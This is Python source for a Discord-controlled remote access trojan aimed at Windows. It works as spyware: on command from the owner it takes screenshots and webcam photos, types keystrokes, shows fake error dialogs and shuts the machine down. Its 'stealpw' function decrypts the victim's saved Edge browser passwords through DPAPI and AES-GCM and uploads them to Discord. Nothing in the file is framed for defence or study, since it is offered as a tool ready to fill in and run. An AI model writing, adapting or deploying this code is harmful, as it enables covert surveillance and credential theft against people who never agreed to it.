token = "PUT YOUR DISCORD TOKEN HERE!"
ownerid = "PUT YOUR DISCORD USER ID HERE!"
foldername = "\WindowsSysFolder" #keep the \

import psutil, os, pyautogui, cv2, ctypes, comtypes, discord, time, urllib.request, json, base64, sqlite3, win32crypt, shutil, logging
from pathlib import Path
import win32.lib.win32con as win32con
import win32com.client as wincl
from win32 import win32gui
from Cryptodome.Cipher import AES
from datetime import timezone, datetime, timedelta

#pw thingy
if os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge","User Data", "Local State"):
	local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge","User Data", "Local State")
elif os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome","User Data", "Local State"):
	local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome","User Data", "Local State")


#wait for internet
def connect(host='http://google.com'):
	try:
		urllib.request.urlopen(host)
		return True
	except:
		return False
if connect():
	print("Nice! There's internet connection.")
else:
	print("No internet connection.")
	while not connect():
		print("Trying again in 15 seconds.")
		time.sleep(15)
		print("Trying again...")
		if connect():
			print("Finally connection!")
			break
		print("Still no connection.")

home = str(Path.home())

#check for tempfolder
if not home + foldername:
	os.mkdir(home + foldername)
	directory = str(home + foldername)
	os.chdir(directory)
	print("No folder, creating one...")

elif home + foldername:
	directory = str(home + foldername)
	os.chdir(directory)

#setup bot
intents = discord.Intents().all()
bot = discord.Client(intents=intents)

#random functions
def checkIfProcessRunning(processName):
	for proc in psutil.process_iter():
		try:
			if processName.lower() in proc.name().lower():
				return True
		except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
			pass
	return False

def getApps():

	global infos
	global steamStatus

	if(checkIfProcessRunning("steam.exe")):
		steamStatus = "steam :green_square:, "
	elif(not checkIfProcessRunning("steam.exe")):
		steamStatus = "steam :red_square:, "
	return

	infos=steamStatus

def stealpw(fname):
	
	def chrome_date_and_time(chrome_data):
		return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


	def fetching_encryption_key():
		# Local_computer_directory_path will look
		# like this below
		# C: => Users => <Your_Name> => AppData =>
		# Local => Google => Chrome => User Data =>
		# Local State
		
		with open(local_computer_directory_path, "r", encoding="utf-8") as f:
			local_state_data = f.read()
			local_state_data = json.loads(local_state_data)

		# decoding the encryption key using base64
		encryption_key = base64.b64decode(
		local_state_data["os_crypt"]["encrypted_key"])
		
		# remove Windows Data Protection API (DPAPI) str
		encryption_key = encryption_key[5:]
		
		# return decrypted key
		return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


	def password_decryption(password, encryption_key):
		try:
			iv = password[3:15]
			password = password[15:]
			
			# generate cipher
			cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
			
			# decrypt password
			return cipher.decrypt(password)[:-16].decode()
		except:
			
			try:
				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
			except:
				return "No Passwords"


	def main():
		key = fetching_encryption_key()
		db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
							"Microsoft", "Edge", "User Data", "default", "Login Data")
		filename = "ChromePasswords.db"
		shutil.copyfile(db_path, filename)
		
		# connecting to the database
		db = sqlite3.connect(filename)
		cursor = db.cursor()
		
		# 'logins' table has the data
		cursor.execute(
			"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
			"order by date_last_used")
		
		# iterate over all rows
		for row in cursor.fetchall():
			main_url = row[0]
			login_page_url = row[1]
			user_name = row[2]
			decrypted_password = password_decryption(row[3], key)
			date_of_creation = row[4]
			last_usuage = row[5]
			
			if user_name or decrypted_password and date_of_creation != 86400000000 and date_of_creation and last_usuage != 86400000000 and last_usuage:
				logging.basicConfig(filename=fname,
						filemode='a',
						format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
						datefmt='%H:%M:%S',
						level=logging.DEBUG)
				
				logging.info(f"Main URL: {main_url}")
				logging.info(f"Login URL: {login_page_url}")
				logging.info(f"User name: {user_name}")
				logging.info(f"Decrypted Password: {decrypted_password}")
				if date_of_creation != 86400000000 and date_of_creation:
					logging.info(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
				if last_usuage != 86400000000 and last_usuage:
					logging.info(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
				logging.info("=" * 50)
			
			else:
				continue
			
		cursor.close()
		db.close()
		
		try:
			
			# trying to remove the copied db file as
			# well from local computer
			os.remove(filename)
		except:
			pass
		logger = logging.getLogger('urbanGUI')


	if __name__ == "__main__":
		main()
		logging.disable()

#dm on startup
@bot.event
async def on_ready():
	print(f'Currently logged in as {bot.user}.')
	user = await bot.fetch_user(ownerid)
	await user.send('PC/Script booted up.')

#commands
@bot.event
async def on_message(message):
	if not message.guild and message.author == await bot.fetch_user(ownerid):
		if message.content == "shutdown":
			await message.channel.send("bye boss :saluting_face:", reference=message)
			os.system('shutdown -s -t 0')

		if message.content == "killsteam":
			if(checkIfProcessRunning("steam.exe")):
				os.system("taskkill /f /im steam.exe")
				await message.channel.send("done lol", reference=message)
			else:
				await message.channel.send("steam not running dum", reference=message)
		
		if message.content == "info" and not message.author.bot:
			msg = await message.channel.send("getting info please wait...", reference=message)
			getApps()
			await msg.edit(content=infos)

		if message.content == "ss" and not message.author.bot:
			filename = "pic2.png"
			msg = await message.channel.send("taking screenshot please wait...", reference=message)
			ss = pyautogui.screenshot()
			ss.save(filename)
			await message.channel.send(file=discord.File(filename))
			await msg.edit(content="voila")
			os.remove(filename)

		if message.content == "pic" and not message.author.bot:
			filename = "pic1.png"
			msg = await message.channel.send("lemme take a pic rq...", reference=message)
			cap = cv2.VideoCapture(0)
			ret,frame = cap.read()
			cv2.imwrite(filename,frame)
			cap.release()
			await message.channel.send(file=discord.File(filename))
			await msg.edit(content="noway i did it")
			os.remove(filename)

		if message.content == "wallpaper" and not message.author.bot:
			if message.attachments:
				msg = await message.channel.send("doing it gimme a sec...", reference=message)
				path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
				await message.attachments[0].save(path)
				ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
				await msg.edit(content="did it")
			elif not message.attachments:
				await message.channel.send("bro forgor the photo", reference=message)
				
		if message.content.startswith("write") and not message.author.bot:
			msg = await message.channel.send("currently writing " + message.content[6:], reference=message)
			if message.content[7:] == "enter":
				pyautogui.press("enter")
			else:
				pyautogui.typewrite(message.content[6:])
			await msg.edit(content="did it")

		if message.content.startswith("speak") and not message.author.bot: 
			msg = await message.channel.send("currently speaking " + message.content[6:], reference=message)  
			speak = wincl.Dispatch("SAPI.SpVoice")
			speak.Speak(message.content[6:])
			comtypes.CoUninitialize()
			await msg.edit(content="ok i spoke")

		if message.content.startswith("message") and not message.author.bot: 
			msg = await message.channel.send("currently sending message " + message.content[7:], reference=message)  
			# i literally copypasted this from the internet but works so it's ok
			MB_YESNO = 0x04
			MB_HELP = 0x4000
			ICON_STOP = 0x10
			def mess():
				ctypes.windll.user32.MessageBoxW(0, message.content[7:], "Error", MB_YESNO | ICON_STOP) #Show message box
			import threading
			messa = threading.Thread(target=mess)
			messa._running = True
			messa.daemon = True
			messa.start()
			time.sleep(1)
			hwnd = win32gui.FindWindow(None, "Error") 
			win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
			win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
			win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
			win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
			await msg.edit(content="message sent")

		if message.content == "pw" and not message.author.bot:
			filename="pws.txt"
			try:
				os.remove(filename)
			except:
				print("s")
			msg = await message.channel.send("doing it gimme a sec...", reference=message)
			stealpw(filename)
			time.sleep(1)
			
			await message.channel.send(file=discord.File(filename))
			await msg.edit(content="noway i did it")
			os.remove(filename)
bot.run(token)
